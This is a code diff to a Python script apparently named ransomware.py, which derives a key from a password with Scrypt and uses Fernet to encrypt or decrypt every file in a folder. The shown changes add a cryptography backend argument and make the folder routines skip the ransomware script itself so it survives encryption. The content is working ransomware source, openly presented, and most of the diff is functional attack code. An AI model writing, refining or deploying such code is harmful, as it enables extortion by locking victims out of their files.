@@ -7,6 +7,7 @@ import getpass
 import cryptography
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+from cryptography.hazmat.backends import default_backend
 
 
 """Generate the salt used for key derivation,
@@ -18,7 +19,8 @@ def generate_salt(size=16):
 """Derive the key from the `password` 
     using the passed `salt` """
 def derive_key(salt, password):
-    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
+    backend = default_backend()
+    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1, backend=backend)
     return kdf.derive(password.encode())
 
 """load salt from salt.salt file"""
@@ -60,9 +62,9 @@ def encrypt(filename, key):
 
 """function that encrypt a folder"""
 def encrypt_folder(foldername, key):
-    # if it's a folder, encrypt the entire folder (i.e all the containing files)
+    # if it's a folder, encrypt the entire folder (i.e all the containing files) execpt the ransomware.py file otherwise the decryption will be impossible
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file():
+        if child.is_file() and os.path.basename(child)!="ransomware.py":
             print(f"[*] Encrypting {child}")
             # encrypt the file
             encrypt(child, key)
@@ -90,9 +92,9 @@ def decrypt(filename, key):
 
 """decrypt a folder"""
 def decrypt_folder(foldername, key):
-    # if it's a folder, decrypt the entire folder
+    # if it's a folder, decrypt the entire folder execpt to the 'ransomware.py' file that is not encrypted
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file():
+        if child.is_file() and os.path.basename(child)!="ransomware.py":
             print(f"[*] Decrypting {child}")
             # decrypt the file
             decrypt(child, key)
